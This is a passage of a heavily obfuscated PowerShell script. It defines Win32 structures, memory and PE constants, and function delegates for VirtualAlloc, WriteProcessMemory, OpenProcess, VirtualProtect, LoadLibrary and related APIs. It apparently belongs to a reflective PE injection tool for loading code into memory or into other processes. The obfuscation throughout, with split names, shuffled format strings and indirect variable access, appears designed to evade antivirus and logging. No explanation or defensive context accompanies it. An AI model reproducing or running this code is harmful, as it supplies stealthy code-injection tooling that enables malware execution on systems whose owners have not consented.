        ${TyPE`Bui`LDER}."dEf`inE`FIELD"( 'AddressOfFunctions', [UInt32], 'Public'  )  | & ("{1}{0}"-f'ull','Out-N' )
        ${typeb`Ui`LdER}."Def`InE`F`iElD"(  'AddressOfNames', [UInt32], 'Public'  )   |   &  ( "{1}{2}{0}"-f 'll','Out','-Nu'  )
        ${TYP`e`Build`eR}."DefI`N`EfieLd"('AddressOfNameOrdinals', [UInt32], 'Public'  )  |  & ( "{0}{1}{2}" -f'Ou','t-','Null'  )
        ${ima`g`e_E`x`P`OrT_DIReCTorY}   = ${tyPEb`UI`ldeR}.("{3}{0}{2}{1}"-f 'r','e','eateTyp','C'  ).Invoke()
        ${wIn32ty`p`ES} |   & (  "{2}{1}{0}" -f 'mber','d-Me','Ad' ) -MemberType (  "{0}{2}{1}{3}" -f'NoteProp','rt','e','y'  ) -Name (  "{0}{1}{3}{2}{5}{4}" -f 'I','M','T_','AGE_EXPOR','Y','DIRECTOR') -Value ${I`MaG`e_eXPORT`_D`IrE`cTORy}

       
        ${a`TTRIBU`TES}   = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${T`yPEBuil`DER}  =  ${MO`d`ULeBUIl`DEr}."d`EFIne`Ty`PE"('LUID', ${AT`TriB`UTES}, [System.ValueType], 8)
        ${T`y`peBUil`dER}."D`EFIn`efIeLD"('LowPart', [UInt32], 'Public'  )  |   &  ( "{1}{0}{2}"-f '-N','Out','ull'  )
        ${tYPe`BuIl`deR}."DEFi`N`EfIELD"( 'HighPart', [UInt32], 'Public')   |   & ( "{0}{1}{2}"-f 'Out','-Nul','l' )
        ${Lu`ID}   =   ${Ty`p`EbuiL`deR}.( "{0}{1}{2}"-f 'Create','T','ype').Invoke(  )
        ${win`32tY`PeS}  |  &( "{1}{2}{0}" -f 'mber','Add','-Me'  ) -MemberType ("{1}{2}{0}" -f'roperty','No','teP') -Name ("{1}{0}" -f 'UID','L' ) -Value ${l`Uid}

       
        ${A`T`T`RiButes}   =  'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${typE`BuI`ldER}  = ${MODU`lEb`U`ILd`Er}."D`eF`In`ETypE"( 'LUID_AND_ATTRIBUTES', ${a`TTrIBU`T`Es}, [System.ValueType], 12)
        ${tYPeb`Uil`dEr}.( "{1}{2}{0}{3}" -f'ne','Def','i','Field').Invoke(  'Luid', ${L`UID}, 'Public'  ) |    &  ("{1}{0}{2}" -f 't-Nu','Ou','ll'  )
        ${tyP`E`B`UIldER}."dE`Fi`NeFiE`Ld"('Attributes', [UInt32], 'Public'  )   |   &  (  "{2}{1}{0}" -f'l','-Nul','Out' )
        ${lUID`_A`N`d`_AtTRIbuTES}  = ${TYPeb`U`I`LdeR}.("{1}{2}{0}" -f 'ype','Cre','ateT'  ).Invoke( )
        ${w`iN32t`yPES}   |   &  ("{1}{0}{2}" -f 'dd-M','A','ember'  ) -MemberType ( "{2}{3}{1}{0}"-f 'ty','oper','NoteP','r') -Name ("{4}{1}{5}{0}{2}{3}" -f'AND_ATT','I','RI','BUTES','LU','D_' ) -Value ${LUi`d`_`ANd_`AT`TrIbu`TeS}

       
        ${AT`TRI`But`Es}  =   'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${T`Yp`ebUIlD`Er}  = ${MOd`UL`Eb`UI`LDEr}."d`eFi`NEtYpe"('TOKEN_PRIVILEGES', ${A`TtrIbuT`Es}, [System.ValueType], 16  )
        ${TY`pEBuIL`Der}."dE`FIneF`i`elD"( 'PrivilegeCount', [UInt32], 'Public' ) |  &  ("{2}{0}{1}" -f't','-Null','Ou'  )
        ${typEB`UiL`D`Er}.( "{0}{2}{1}" -f 'Defi','Field','ne').Invoke('Privileges', ${LUID_`ANd_`A`TtRibu`TeS}, 'Public') |   &  (  "{0}{1}" -f 'Out','-Null' )
        ${tOkE`N`_p`R`iviLEG`Es}  = ${Ty`p`Eb`UiLdER}.( "{0}{3}{1}{2}" -f'Crea','eTyp','e','t' ).Invoke(  )
        ${Wi`N32ty`PeS}  |     &( "{2}{3}{1}{0}" -f'er','mb','Ad','d-Me') -MemberType ( "{3}{2}{0}{1}" -f'pe','rty','tePro','No') -Name ("{0}{1}{2}{3}" -f'T','OKEN_PRIVI','L','EGES') -Value ${t`oK`EN_Pri`V`iLeGes}

        return ${w`i`N32`TypEs}
    }

    Function GeT-w`In3`2cO`NsTANts
    {
        ${wIn32Con`s`T`ANTs}   =    &  (  "{2}{1}{3}{0}" -f't','-Obj','New','ec' ) ( "{1}{2}{0}"-f'.Object','Syst','em' )

        ${wI`N`32C`o`NSTaNtS}  |    &  (  "{0}{3}{2}{1}" -f'A','Member','d-','d'  ) -MemberType (  "{1}{0}{2}" -f'Pr','Note','operty' ) -Name ("{2}{1}{0}"-f 'OMMIT','_C','MEM') -Value 0x00001000
        ${WI`N32`COnSTa`NTS}   |    & ("{3}{2}{0}{1}"-f 'Membe','r','dd-','A'  ) -MemberType (  "{2}{1}{0}{3}" -f'P','ote','N','roperty') -Name (  "{0}{2}{1}"-f'M','_RESERVE','EM'  ) -Value 0x00002000
        ${wi`N3`2`cOnstaN`TS}   |   &  ( "{0}{2}{1}"-f 'Ad','-Member','d'  ) -MemberType ( "{3}{2}{0}{1}" -f'p','erty','Pro','Note' ) -Name (  "{1}{0}{2}"-f 'CCES','PAGE_NOA','S') -Value 0x01
        ${wiN32c`O`NsTAnts}  |    &(  "{1}{0}{2}" -f 'd-Membe','Ad','r') -MemberType (  "{3}{1}{0}{2}"-f'rope','eP','rty','Not'  ) -Name ( "{0}{1}{2}"-f 'PAGE_RE','AD','ONLY'  ) -Value 0x02
        ${wI`N32consT`A`N`Ts}   |   & (  "{0}{2}{1}"-f'Add-','er','Memb') -MemberType ("{0}{2}{1}"-f'NoteProper','y','t') -Name ( "{3}{0}{1}{2}"-f'AGE_','RE','ADWRITE','P') -Value 0x04
        ${Wi`N32Con`StAN`TS}  |    &  ( "{1}{2}{0}"-f'er','A','dd-Memb') -MemberType (  "{3}{0}{2}{1}"-f 'te','operty','Pr','No'  ) -Name (  "{1}{3}{0}{2}" -f 'WRITECO','PAG','PY','E_' ) -Value 0x08
        ${wIN32`con`sTan`TS} |    &(  "{2}{0}{1}"-f'e','r','Add-Memb' ) -MemberType ("{0}{1}{2}"-f'Not','eProper','ty' ) -Name ("{1}{0}{2}" -f 'GE','PA','_EXECUTE') -Value 0x10
        ${wiN32CON`s`Ta`NtS} |    & (  "{1}{2}{0}" -f'mber','Add-M','e') -MemberType ( "{1}{2}{0}{3}" -f'roper','N','oteP','ty') -Name ("{0}{3}{2}{1}"-f 'P','READ','_EXECUTE_','AGE'  ) -Value 0x20
        ${wIN32c`on`S`T`ANTS}  |   &(  "{0}{3}{1}{2}"-f 'Add-','b','er','Mem'  ) -MemberType ( "{1}{2}{0}" -f 'ty','Note','Proper'  ) -Name (  "{4}{1}{3}{5}{2}{0}"-f 'WRITE','AGE_','AD','EXECU','P','TE_RE'  ) -Value 0x40
        ${W`in32C`o`NSta`Nts} |  & ( "{2}{0}{1}" -f'e','r','Add-Memb'  ) -MemberType ( "{2}{0}{1}"-f'roper','ty','NoteP') -Name ( "{3}{1}{4}{0}{2}"-f 'WRITECO','_EXECUT','PY','PAGE','E_') -Value 0x80
        ${W`i`N32cOnSTAnts}   |    &  (  "{0}{1}{2}"-f 'Add-','Membe','r' ) -MemberType ("{1}{2}{0}"-f 'roperty','Not','eP') -Name ("{2}{0}{1}"-f'E_NO','CACHE','PAG') -Value 0x200
        ${w`IN`32CO`NStAnTS}  |   &  ( "{0}{2}{1}"-f'A','ber','dd-Mem' ) -MemberType ("{2}{0}{1}" -f 't','eProperty','No') -Name (  "{2}{0}{1}{3}{4}"-f 'M','AGE','I','_REL_BASED_','ABSOLUTE' ) -Value 0
        ${WiN32Co`NSTAn`TS}   |    &  (  "{2}{0}{1}"-f'-Membe','r','Add') -MemberType (  "{0}{1}{2}"-f 'Note','Proper','ty'  ) -Name ( "{3}{4}{7}{2}{0}{6}{1}{5}" -f'_HIG','L','D','IMAGE_REL_','BA','OW','H','SE') -Value 3
        ${wIN32`cON`St`AnTs}   |     &("{2}{1}{0}" -f'mber','-Me','Add') -MemberType ("{1}{0}{3}{2}"-f 'e','Not','y','Propert'  ) -Name ("{5}{4}{1}{2}{3}{0}" -f'4','REL_BASED_D','IR','6','AGE_','IM') -Value 10
        ${w`In`32CONSta`NtS}   |  &  ( "{1}{2}{3}{0}"-f 'r','Ad','d','-Membe' ) -MemberType ( "{3}{1}{2}{0}" -f'erty','eP','rop','Not'  ) -Name ("{0}{1}{2}{4}{5}{3}"-f'IM','A','GE_SCN_ME','E','M_DI','SCARDABL' ) -Value 0x02000000
        ${Win3`2`C`onStANTs}   |    &("{0}{2}{1}"-f'A','er','dd-Memb' ) -MemberType ("{1}{3}{2}{0}"-f'ty','No','per','tePro'  ) -Name ("{5}{1}{0}{2}{3}{4}" -f'M','_SCN_','EM','_EXE','CUTE','IMAGE') -Value 0x20000000
        ${W`in32c`O`NSTan`Ts}  |     &("{0}{2}{1}"-f 'Add','mber','-Me' ) -MemberType ( "{2}{0}{1}"-f'te','Property','No' ) -Name ( "{1}{2}{0}{3}"-f 'RE','IMAGE_SC','N_MEM_','AD') -Value 0x40000000
        ${w`IN32C`On`ST`Ants}   |   &  ("{2}{0}{1}" -f 'be','r','Add-Mem') -MemberType ("{1}{2}{0}{3}" -f'e','N','ot','Property' ) -Name ( "{5}{3}{1}{2}{0}{4}"-f 'WR','_M','EM_','MAGE_SCN','ITE','I' ) -Value 0x80000000
        ${WIn3`2c`oNsT`A`Nts}   |    & (  "{0}{2}{1}" -f'Ad','ber','d-Mem'  ) -MemberType (  "{2}{1}{0}{3}"-f 'Propert','ote','N','y' ) -Name ( "{5}{1}{3}{2}{6}{4}{7}{0}" -f 'CACHED','AGE_','_ME','SCN','NO','IM','M_','T_') -Value 0x04000000
        ${wI`N`32coNstanTs}   |     & ("{0}{1}{2}"-f 'Add-','Me','mber' ) -MemberType ( "{2}{3}{1}{0}" -f 'y','pert','NoteP','ro' ) -Name ( "{2}{0}{1}"-f'_','DECOMMIT','MEM'  ) -Value 0x4000
        ${wiN`32co`NSt`ANTs}   |  & ("{0}{1}{2}"-f'Add','-','Member') -MemberType ( "{2}{0}{3}{1}"-f 'te','erty','No','Prop' ) -Name ( "{0}{2}{3}{6}{4}{5}{1}" -f'IM','IMAGE','A','GE_FI','L','E_','LE_EXECUTAB' ) -Value 0x0002
        ${WiN32Con`S`T`An`TS}   |   & ( "{1}{0}{2}" -f'dd-Mem','A','ber' ) -MemberType ("{1}{3}{0}{2}"-f'ope','Not','rty','ePr'  ) -Name ( "{0}{1}{2}{3}"-f 'I','MAGE','_FILE_D','LL') -Value 0x2000
        ${w`In32C`OnS`TAnTS}  |   &("{2}{1}{0}"-f 'mber','e','Add-M') -MemberType (  "{0}{1}{2}" -f 'NotePr','o','perty'  ) -Name (  "{6}{5}{1}{3}{9}{0}{8}{4}{7}{2}" -f'_D','CTERIS','E','T','NAMI','GE_DLLCHARA','IMA','C_BAS','Y','ICS'  ) -Value 0x40
        ${WIN3`2C`oNS`T`Ants} |     &  ( "{1}{0}{2}"-f 'd-M','Ad','ember' ) -MemberType ("{1}{0}{2}" -f'tePropert','No','y' ) -Name (  "{2}{1}{0}{6}{3}{4}{5}"-f 'CHARACTE','GE_DLL','IMA','STICS_NX','_','COMPAT','RI') -Value 0x100
        ${wIN32`cONsTa`NtS}   |    & (  "{1}{0}{2}" -f'd-','Ad','Member'  ) -MemberType ("{2}{1}{0}"-f'rty','pe','NotePro' ) -Name ( "{2}{0}{1}"-f '_','RELEASE','MEM' ) -Value 0x8000
        ${W`in32c`OnSTAN`Ts}   |     & ( "{1}{3}{2}{0}"-f'ember','A','-M','dd'  ) -MemberType ("{0}{1}{2}{3}" -f 'No','teProp','ert','y') -Name ( "{0}{2}{1}" -f'TOK','RY','EN_QUE'  ) -Value 0x0008
        ${wIN3`2CO`NS`TaNtS}   | & (  "{2}{1}{0}" -f 'ber','-Mem','Add' ) -MemberType (  "{1}{2}{0}{3}"-f 't','NoteProp','er','y' ) -Name (  "{2}{5}{1}{0}{4}{3}" -f 'ST_','U','TOKEN_','GES','PRIVILE','ADJ'  ) -Value 0x0020
        ${win`32coNS`T`AN`Ts} |   &  ("{2}{1}{0}{3}"-f 'mb','-Me','Add','er') -MemberType ("{2}{0}{1}"-f'P','roperty','Note') -Name ( "{3}{1}{2}{0}"-f'BLED','LEGE_E','NA','SE_PRIVI') -Value 0x2
        ${WIn`32C`oNSt`AnTs}  |    &( "{3}{0}{1}{2}"-f 'M','embe','r','Add-' ) -MemberType ( "{1}{2}{0}{3}"-f 'e','N','ot','Property' ) -Name (  "{1}{2}{0}{3}"-f '_NO_','ER','ROR','TOKEN'  ) -Value 0x3f0

        return ${W`i`N`32c`oNStaNts}
    }

    Function g`E`T-Wi`N32fUN`CtiONs
    {
        ${wI`N32`FuNC`Tions}  =   &  ("{1}{3}{2}{0}" -f 'ect','N','Obj','ew-'  ) (  "{0}{1}{4}{3}{2}"-f'Sy','ste','Object','.','m' )

        ${V`irTua`l`ALL`OCADDR}   =   & ( "{2}{0}{3}{1}" -f '-','ss','Get','ProcAddre'  ) ("{0}{1}{2}{3}" -f 'k','ernel3','2.d','ll' ) ("{2}{0}{1}{3}" -f 'irt','ualA','V','lloc'  )
        ${virT`U`AlaL`L`o`cDELeGA`Te}  =    & ("{2}{0}{3}{4}{1}"-f '-Delegat','e','Get','eT','yp' ) @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ( [IntPtr]  )
        ${V`irtualAL`LOC} =    (  VArIAbLE  aL9J  -vaL )::("{3}{2}{0}{5}{8}{1}{4}{6}{7}"-f 'ele','n','D','Get','ctionPoi','gateForF','n','ter','u').Invoke(${ViRTUAl`AlLOC`A`Ddr}, ${Vi`RTuAlalLO`c`Del`E`ga`Te}  )
        ${wIN32fU`Nc`T`iO`Ns} |   & (  "{2}{0}{1}" -f 'mbe','r','Add-Me' ) ("{1}{3}{2}{0}"-f 'operty','N','tePr','o' ) -Name ("{0}{2}{1}"-f 'Vir','alAlloc','tu'  ) -Value ${vIrTu`AlA`LlOc}

        ${VI`RtuAlal`l`ocexADDr} =    &(  "{0}{3}{2}{1}" -f'G','ss','ProcAddre','et-') (  "{1}{0}{2}" -f'32.dl','kernel','l' ) ("{3}{0}{1}{2}{4}"-f 'ir','tua','lAllo','V','cEx'  )
        ${v`IRT`UalA`L`l`OceX`dELeGaTE}  = &(  "{3}{0}{1}{2}" -f 't-Del','egateT','ype','Ge') @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32] ) ([IntPtr] )
        ${v`irTU`AL`Al`locEX}   =     $AL9j::( "{2}{1}{5}{4}{3}{0}" -f'r','Deleg','Get','onPointe','rFuncti','ateFo' ).Invoke(${vi`R`TuaLALL`ocE`xAD`Dr}, ${vi`RtUaLAlL`oc`exD`ELegate}  )
        ${wI`N32funct`I`o`Ns}  | &(  "{0}{2}{1}" -f 'Add-Me','er','mb'  ) ("{3}{2}{0}{1}" -f 'roper','ty','eP','Not') -Name ("{1}{2}{0}" -f'x','VirtualAllo','cE' ) -Value ${vi`Rt`UaLA`Ll`OceX}

        ${Me`mcpy`ADDR}  =    &  ( "{2}{1}{0}{3}" -f'd','ProcA','Get-','dress') (  "{0}{1}{2}" -f 'msv','crt.','dll'  ) ("{0}{2}{1}" -f 'm','cpy','em' )
        ${m`Emc`p`y`DELeGaTE} =   & ("{1}{4}{2}{0}{3}" -f'egateT','Get','l','ype','-De'  ) @([IntPtr], [IntPtr], [UIntPtr]) ( [IntPtr] )
        ${MeM`Cpy}   =    $AL9J::(  "{6}{1}{3}{5}{2}{0}{4}" -f 'inte','e','ionPo','F','r','orFunct','GetDelegat'  ).Invoke(  ${M`EMc`PYaDdR}, ${m`emcpyDElEGA`Te})
        ${WIN32`FuNc`T`IO`NS}  |  & ("{2}{0}{1}"-f'-Me','mber','Add') -MemberType ( "{1}{2}{0}{3}"-f 'Proper','N','ote','ty') -Name (  "{1}{0}"-f'cpy','mem') -Value ${M`EMc`Py}

        ${m`eMse`TADDR} =     &  (  "{1}{2}{0}{3}{4}" -f't-Proc','G','e','Addr','ess') ("{0}{2}{1}" -f'msvc','ll','rt.d') ("{0}{1}{2}"-f 'm','ems','et' )
        ${MEms`et`d`e`Legate}  =  & (  "{2}{3}{1}{0}" -f'ype','gateT','Ge','t-Dele') @([IntPtr], [Int32], [IntPtr] ) (  [IntPtr]  )
        ${mEM`s`ET} =     (GeT-vARIablE  (  "AL9"  + "j" ) -vAlUeO  )::( "{4}{0}{8}{5}{3}{1}{2}{7}{6}" -f 't','gateF','or','le','Ge','e','nPointer','Functio','D'  ).Invoke(  ${MEmsETa`D`Dr}, ${MEm`seTd`eLe`G`Ate})
        ${WIn`3`2FuNc`TIoNS}   |   &(  "{0}{3}{1}{2}"-f'Add','embe','r','-M'  ) -MemberType ( "{2}{0}{1}"-f'eP','roperty','Not' ) -Name (  "{1}{2}{0}"-f 't','mems','e' ) -Value ${m`EMSET}

        ${Loa`dl`Ib`RaRYAddR} =   & (  "{2}{0}{1}{3}" -f 'et-Pro','cAdd','G','ress') (  "{3}{2}{1}{0}" -f 'l32.dll','ne','er','k'  ) (  "{0}{1}{2}"-f 'Loa','dLibrar','yA'  )
        ${Load`liBrar`yD`El`E`gaTe} =    &( "{1}{4}{3}{2}{0}"-f'gateType','Ge','le','-De','t'  ) @([String] ) ( [IntPtr])
        ${lOADl`iB`Ra`RY} =  (Ls  ( "V"+  "Ar" + "Ia"+ "ble:aL9J")  ).vAlUe::( "{5}{2}{6}{0}{3}{4}{1}{8}{7}" -f'ele','i','e','g','ateForFunct','G','tD','ointer','onP').Invoke(  ${Load`l`ibRAry`ADdr}, ${LoADLiBR`A`RYDeLE`GaTE}  )
        ${w`iN3`2FUN`c`TIOns} |    &  (  "{0}{2}{1}" -f'Ad','ber','d-Mem') -MemberType (  "{3}{0}{1}{2}" -f'o','per','ty','NotePr'  ) -Name ( "{0}{2}{1}"-f'LoadL','brary','i' ) -Value ${Lo`A`DLIb`RAry}

        ${GetP`ROCA`DD`Res`sAddr}  =    & (  "{2}{1}{0}{3}"-f 'ocA','r','Get-P','ddress' ) ("{2}{0}{1}{3}" -f 'ne','l32.d','ker','ll'  ) (  "{2}{0}{1}"-f 'tProcAd','dress','Ge' )
        ${GEt`Pro`cad`DrES`sdeL`eGaTe}   =  & ("{0}{3}{2}{1}{5}{4}"-f'Ge','te','ega','t-Del','ype','T'  ) @([IntPtr], [String] ) (  [IntPtr])
        ${get`PRoca`Dd`Re`ss}   =     (   VARiabLE Al9j  -vaLUEOnL )::( "{4}{0}{3}{1}{2}{6}{5}"-f 'eFo','tionP','oin','rFunc','GetDelegat','er','t').Invoke( ${gE`Tp`ROc`AdDRes`SADdR}, ${geT`pROcaDD`R`eSsD`eLEgaTe} )
        ${wIn32f`UNCTi`O`NS}   |  &  (  "{0}{1}{2}{3}"-f'A','dd','-Mem','ber') -MemberType (  "{2}{1}{0}" -f 'erty','rop','NoteP'  ) -Name ( "{1}{3}{0}{2}" -f 'es','Ge','s','tProcAddr' ) -Value ${GeT`Pr`oC`AddrEss}

        ${gEtp`ROC`ADD`R`esSOr`D`InalAdDr} =  &(  "{3}{0}{1}{2}"-f'o','cAddre','ss','Get-Pr' ) (  "{2}{0}{1}{3}" -f'rn','el32.','ke','dll' ) ( "{2}{1}{3}{0}"-f 'ddress','o','GetPr','cA')
        ${G`ETP`ROc`AddReS`sO`RDi`Nal`del`egAte}  =    &(  "{0}{3}{1}{2}"-f'G','elegateT','ype','et-D') @([IntPtr], [IntPtr] ) (  [IntPtr]  )
        ${g`ET`pRocAD`dr`eSS`Or`dinal} =  ( dIr  VARiaBlE:aL9j  ).vALuE::( "{0}{2}{1}{5}{3}{7}{4}{6}"-f 'G','lega','etDe','eFo','t','t','ionPointer','rFunc'  ).Invoke(  ${gETpRo`c`A`ddrEssORD`InALAd`DR}, ${GET`p`RoCadDrESsordiN`AlDe`leGA`Te} )
        ${wIn32`FuNC`Ti`o`NS}   | & ( "{3}{0}{2}{1}"-f '-Me','ber','m','Add') -MemberType ( "{0}{1}{3}{2}"-f 'Note','Prope','ty','r') -Name (  "{4}{1}{2}{0}{3}" -f're','P','rocAdd','ssOrdinal','Get'  ) -Value ${GETprO`cad`d`R`eSS`oRdi`NAL}

        ${ViRtu`ALfRE`Eaddr} =  & ("{2}{0}{3}{1}" -f 'et-P','Address','G','roc' ) ("{1}{2}{0}" -f'32.dll','k','ernel' ) (  "{3}{0}{2}{1}" -f'irt','lFree','ua','V')
        ${virTuaLfRe`e`DeL`eg`Ate}   =    &  (  "{1}{2}{4}{0}{3}{5}"-f 'a','Ge','t-Dele','teTyp','g','e') @([IntPtr], [UIntPtr], [UInt32]  ) ([Bool] )
        ${ViR`TuA`lFREE}  =   $aL9j::(  "{6}{4}{7}{1}{3}{2}{0}{8}{5}" -f 'nt','egat','onPoi','eForFuncti','t','r','Ge','Del','e').Invoke(  ${vi`RtUaL`FrEE`Ad`Dr}, ${ViRT`UA`lf`ReedEL`E`gATE})
        ${wi`N3`2func`TIoNs}   |    &(  "{0}{2}{3}{1}" -f 'Add','er','-Me','mb') (  "{1}{2}{0}" -f 'y','N','otePropert'  ) -Name (  "{0}{1}{3}{2}" -f'Vir','tualFr','e','e'  ) -Value ${vi`RtuA`LFREe}

        ${Virt`U`AlFR`EeEX`A`dDr} =  &( "{0}{2}{3}{1}{4}"-f'Get','ocAdd','-P','r','ress' ) ("{3}{0}{1}{2}" -f'el3','2','.dll','kern'  ) ("{3}{2}{1}{0}"-f 'reeEx','F','al','Virtu')
        ${vI`R`TU`AlFR`EeExDELEgAtE} =  & (  "{0}{3}{1}{2}" -f'Get-','legateT','ype','De'  ) @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ( [Bool]  )
        ${v`i`R`Tual`FREEeX} =    $AL9j::("{7}{3}{2}{5}{0}{1}{4}{6}" -f'ion','Poi','t','ga','n','eForFunct','ter','GetDele'  ).Invoke(${vIr`T`Ual`FREEeXaddr}, ${VIR`Tua`LFR`eE`EXDeLeG`A`TE} )
        ${WI`N32fU`N`Ctio`NS}   |   &( "{1}{2}{0}" -f'ber','Add','-Mem'  ) ("{1}{0}{2}" -f 'ePr','Not','operty'  ) -Name ( "{2}{0}{1}" -f 'rt','ualFreeEx','Vi'  ) -Value ${VirtUa`l`FrEe`EX}

        ${ViR`TuAlPrOt`E`c`T`Ad`dr}  =   &  ( "{3}{0}{2}{1}"-f'rocAd','ress','d','Get-P'  ) (  "{3}{1}{2}{0}"-f'32.dll','r','nel','ke'  ) (  "{3}{0}{2}{1}" -f'rt','ect','ualProt','Vi'  )
        ${V`iRTuAlp`Rote`c`T`DE`lEGaTE}   = &  (  "{2}{1}{0}{3}"-f'elegateTyp','t-D','Ge','e'  ) @([IntPtr], [UIntPtr], [UInt32],   (   geT-iTem ( 'VAriA'+  'bl'+'e:'+  '1x8'+  'Dw'  )).VaLuE.(  "{3}{1}{2}{0}" -f'pe','ef','Ty','MakeByR'  ).Invoke(   )) ( [Bool]  )
        ${VI`RtuA`lpRoT`e`Ct}   =    $Al9j::("{5}{4}{0}{2}{1}{3}"-f'gateFor','ctionP','Fun','ointer','etDele','G').Invoke(  ${V`iRtUal`pR`o`TectAdDR}, ${VIr`TUa`LPROtEc`T`DelEG`AtE}  )
        ${wIn3`2FuN`Cti`ONS}   | & ("{1}{2}{0}"-f 'er','Add-Mem','b') ("{1}{2}{0}"-f'rty','No','tePrope' ) -Name (  "{0}{2}{1}"-f'Virt','ct','ualProte' ) -Value ${V`irtUa`LPROtECT}

        ${Ge`TmODuL`EHa`Ndl`EAD`DR}   =   &( "{2}{1}{0}{4}{3}" -f'-Proc','et','G','ress','Add'  ) ("{0}{3}{2}{1}"-f 'kern','2.dll','l3','e') ("{2}{1}{0}"-f'A','eHandle','GetModul')
        ${gEtMO`Du`lehAN`DL`eDe`leGate} =  &  ("{4}{2}{1}{0}{3}" -f'Ty','legate','e','pe','Get-D') @([String] ) ( [IntPtr])
        ${GETMO`duleh`ANd`Le} =    (  ls  ( "VaRI" + "AbLE:al9"+  "j")    ).valUE::("{6}{3}{7}{0}{4}{2}{5}{1}"-f'gat','onPointer','orFun','t','eF','cti','Ge','Dele'  ).Invoke( ${ge`TModuL`E`HANdLe`AD`dr}, ${gETmO`d`Ul`eha`NdLEdEleGA`Te} )
        ${w`in3`2fuN`Cti`oNs}  |  &("{0}{1}{2}" -f'Add','-M','ember') ("{0}{1}{2}" -f 'N','otePrope','rty'  ) -Name (  "{3}{2}{1}{0}" -f'le','leHand','Modu','Get' ) -Value ${GEtMO`dULEHa`N`dLe}

        ${f`REEli`BR`Ar`yaDDR} =   &( "{4}{1}{0}{3}{2}"-f 'ddr','-ProcA','ss','e','Get') ("{2}{0}{1}" -f'r','nel32.dll','ke') ( "{2}{1}{3}{0}"-f'y','eL','Fre','ibrar' )
        ${F`RE`eLIbRaRyd`ELe`g`ATE}  =   &("{4}{3}{1}{0}{2}" -f 'le','-De','gateType','t','Ge') @([IntPtr] ) ([Bool])
        ${f`RE`ElI`BRARY}   =    $aL9J::(  "{1}{2}{5}{0}{4}{3}{7}{6}" -f 'eForFunct','Get','Deleg','int','ionPo','at','r','e').Invoke(  ${f`Re`el`ibRAR`ya`ddR}, ${FrE`eLIb`RARydE`lEgATe}  )
        ${w`i`N3`2fuNctI`onS}   |    &(  "{0}{1}{2}"-f 'Add-M','embe','r'  ) -MemberType (  "{3}{2}{0}{1}" -f 'p','erty','o','NotePr'  ) -Name ( "{1}{0}{2}"-f 'eeL','Fr','ibrary') -Value ${f`REElI`BrAry}

        ${oPEnPrOCe`s`SaDdr}  =    &  ("{3}{0}{1}{2}" -f'-Pro','cAddres','s','Get' ) ( "{0}{1}{3}{2}"-f 'kernel3','2','ll','.d'  ) ("{1}{2}{0}" -f's','OpenPr','oces'  )
        ${OP`EnPROc`eSs`de`Legate}  = &("{2}{0}{3}{1}{4}" -f 'e','p','Get-Delegat','Ty','e' ) @([UInt32], [Bool], [UInt32]) ([IntPtr]  )
        ${o`penPR`ocess}  =  $Al9j::( "{0}{3}{6}{5}{4}{1}{2}"-f'Get','onPoi','nter','Delega','ti','unc','teForF').Invoke(${o`PEn`PR`oCeSSadDR}, ${o`pe`NproCeSs`de`lE`GATe}  )
        ${w`iN3`2Fu`NcTiOns}  |  &(  "{2}{1}{0}"-f'mber','Me','Add-' ) -MemberType ( "{1}{3}{2}{0}"-f'ty','Not','Proper','e' ) -Name (  "{1}{0}{2}"-f'penProc','O','ess' ) -Value ${OPE`Npr`ocesS}

        ${wa`itForsINgleo`Bj`eCt`Ad`DR} =  &  ( "{2}{1}{0}{3}"-f 'Ad','t-Proc','Ge','dress') ( "{1}{0}{2}" -f '.','kernel32','dll') ( "{2}{4}{1}{0}{3}"-f 'bje','ngleO','WaitF','ct','orSi')
        ${WAI`T`FoRSIngL`eobjec`Tde`LEG`Ate} =    & ( "{4}{3}{0}{2}{1}" -f'ateT','e','yp','Deleg','Get-'  ) @([IntPtr], [UInt32]  ) ( [UInt32])
        ${waITFOrsI`N`gle`Ob`jEcT}   =    (  vARIaBLE  AL9j  ).VaLue::("{6}{5}{4}{1}{0}{3}{2}" -f'onPo','rFuncti','er','int','eFo','egat','GetDel').Invoke(  ${wai`TForSING`le`ob`jeCtA`d`DR}, ${W`AiTFo`RS`ingL`Eo`Bj`eCTd`eLE`gAte})
        ${WiN3`2`FuN`cti`oNS}   |    &("{2}{0}{1}"-f'-Mem','ber','Add'  ) -MemberType (  "{2}{0}{1}"-f 'Pr','operty','Note') -Name ("{1}{0}{2}{4}{5}{3}" -f 'i','Wa','tForS','t','ingle','Objec') -Value ${waitF`O`RS`inGl`EO`BjEct}

        ${WRiTEpr`O`c`ESsmeMo`R`y`AddR} =    &  (  "{3}{4}{0}{1}{2}" -f't','-Proc','Address','G','e') (  "{2}{3}{1}{0}"-f 'dll','.','kernel3','2') (  "{1}{2}{0}{3}" -f'cessMem','W','ritePro','ory')
        ${w`RiTe`PRocE`ssMemoRY`D`elE`GaTE} =  &  (  "{4}{0}{1}{3}{2}"-f 'e','t-','gateType','Dele','G'  ) @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],  (  vAriabLe  078M -ValuE  ).("{2}{1}{0}"-f 'e','yp','MakeByRefT' ).Invoke(    )) (  [Bool] )
        ${wRi`TE`P`RoCEs`SmeMoRY}   =    (  gcI (  "VARiaB" + "l"+  "e:Al9J"  )   ).VALue::("{1}{6}{0}{3}{5}{2}{4}{8}{7}" -f'D','G','gat','el','eF','e','et','nter','orFunctionPoi' ).Invoke(  ${WRit`e`p`Ro`C`eSsme`MorYA`ddr}, ${Writepro`CeSSme`MO`Ryd`El`EG`A`Te}  )
        ${WIN32fuN`Ct`Io`Ns} |   &  ( "{1}{2}{0}" -f'ber','A','dd-Mem' ) -MemberType ("{0}{2}{1}" -f'Not','y','ePropert' ) -Name ("{2}{0}{3}{1}" -f 'iteProces','ry','Wr','sMemo'  ) -Value ${wRi`TEp`ROcES`smemoRY}

        ${rea`d`prOC`e`sSMEMoR`ya`ddR} =  & ("{4}{2}{3}{1}{0}"-f 'ress','dd','Pro','cA','Get-') ( "{3}{2}{0}{1}"-f'nel3','2.dll','er','k') ( "{3}{2}{4}{0}{1}"-f 'cessM','emory','P','Read','ro')
